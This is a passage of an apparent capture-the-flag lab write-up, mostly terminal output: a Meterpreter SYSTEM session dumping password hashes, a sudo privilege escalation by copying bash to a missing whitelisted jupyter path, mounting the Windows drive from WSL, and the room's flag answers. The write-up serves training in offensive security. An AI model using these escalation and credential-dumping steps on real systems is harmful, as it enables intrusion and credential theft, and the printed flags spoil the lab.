[*] Meterpreter session 2 opened (10.8.19.103:4444 -> 10.10.253.75:50416) at 2023-07-20 19:56:31 -0400
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell x64/windows        Shell Banner: Microsoft Wind  10.8.19.103:4444 -> 10.10.253
                                     ows [Version 10.0.17763.3287  .75:50259 (10.10.253.75)
                                     ] -----
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DEV-DA  10.8.19.103:4444 -> 10.10.253
                                     TASCI-JUP                     .75:50416 (10.10.253.75)

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d7d4f4a48120aa6dd9d55bb2436e01c5:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
dev-datasci-lowpriv:1000:aad3b435b51404eeaad3b435b51404ee:cfbe6062058e8e88e97a96f15971a139:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:61e06b5bf9ec01ed1996b0fc03a6a386:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:de2881e234617383355589184f2638ba:::
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

another way

(base) dev-datasci@DEV-DATASCI-JUP:~$ id
uid=1000(dev-datasci) gid=1000(dev-datasci) groups=1000(dev-datasci),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *

(base) dev-datasci@DEV-DATASCI-JUP:~$ ls -la /home/dev-datasci/.local/bin/jupyter
ls: cannot access '/home/dev-datasci/.local/bin/jupyter': No such file or directory

(base) dev-datasci@DEV-DATASCI-JUP:~$ cp /bin/bash /home/dev-datasci/.local/bin/jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo /home/dev-datasci/.local/bin/jupyter
root@DEV-DATASCI-JUP:/home/dev-datasci# id
uid=0(root) gid=0(root) groups=0(root)

root@DEV-DATASCI-JUP:/home/dev-datasci# uname -a
Linux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux

so is a WSL

El Subsistema **de** Windows **para** Linux (**WSL**) es una característica del sistema operativo Windows **que** permite ejecutar un sistema **de** archivos Linux, junto con herramientas **de** línea **de** comandos y aplicaciones **de** GUI **de** Linux, directamente en Windows, junto con el escritorio y las aplicaciones tradicionales **de** Windows.

the internal file system is mounted in _/mnt_ folder in the WSL Linux.

 let’s mount it.

root@DEV-DATASCI-JUP:/home/dev-datasci# cd /mnt
root@DEV-DATASCI-JUP:/mnt# ls

- `mount`: This is the command used to mount filesystems in Linux.
- `-t drvfs`: This option specifies the type of filesystem to be mounted, which is "drvfs" in this case. "drvfs" is a filesystem type used by the Windows Subsystem for Linux (WSL) to access Windows drives.
- `'c:'`: This is the source of the mount, which is the Windows drive letter "C:". The single quotes are used to prevent the shell from interpreting the colon as a special character.
- `/mnt/c`: This is the target directory where the Windows drive will be mounted in the Linux file system. In this case, it is the "/mnt/c" directory.

When you run this command, it will mount the Windows C: drive to the "/mnt/c" directory in your Linux file system. This allows you to access and interact with the files and directories on the C: drive from within the Linux environment.

root@DEV-DATASCI-JUP:/mnt# mount -t drvfs 'c:' /mnt/c
root@DEV-DATASCI-JUP:/mnt# ls
c
root@DEV-DATASCI-JUP:/mnt# cd c
root@DEV-DATASCI-JUP:/mnt/c# ls
ls: cannot read symbolic link 'Documents and Settings': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             PerfLogs        'Program Files (x86)'   Recovery                     Users     datasci-team
'Documents and Settings'  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
root@DEV-DATASCI-JUP:/mnt/c# cd Users/
root@DEV-DATASCI-JUP:/mnt/c/Users# ls
ls: cannot read symbolic link 'All Users': Permission denied
ls: cannot read symbolic link 'Default User': Permission denied
 Administrator  'All Users'   Default  'Default User'   Public   desktop.ini   dev-datasci-lowpriv
root@DEV-DATASCI-JUP:/mnt/c/Users# cd Administrator
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator# ls
ls: cannot read symbolic link 'Application Data': Permission denied
ls: cannot read symbolic link 'Cookies': Permission denied
ls: cannot read symbolic link 'Local Settings': Permission denied
ls: cannot read symbolic link 'My Documents': Permission denied
ls: cannot read symbolic link 'NetHood': Permission denied
ls: cannot read symbolic link 'PrintHood': Permission denied
ls: cannot read symbolic link 'Recent': Permission denied
ls: cannot read symbolic link 'SendTo': Permission denied
ls: cannot read symbolic link 'Start Menu': Permission denied
ls: cannot read symbolic link 'Templates': Permission denied
'3D Objects'
 AppData
'Application Data'
 Contacts
 Cookies
 Desktop
 Documents
 Downloads
 Favorites
 Links
'Local Settings'
 Music
'My Documents'
 NTUSER.DAT
 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
 NetHood
 Pictures
 PrintHood
 Recent
'Saved Games'
 Searches
 SendTo
'Start Menu'
 Templates
 Videos
 ntuser.dat.LOG1
 ntuser.dat.LOG2
 ntuser.ini
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator# cd Desktop
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# ls
 ChromeSetup.exe               'Visual Studio Code.lnk'   desktop.ini               root.txt
 Ubuntu2004-220404.appxbundle   banner.txt                python-3.10.6-amd64.exe
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# cat root.txt
THM{evelated_w3as3l_l0ngest_boi}


```

What is the user.txt flag?

*THM{w3as3ls_@nd_pyth0ns}*

What is the root.txt flag?

*THM{evelated_w3as3l_l0ngest_boi}*


[[Different CTF]]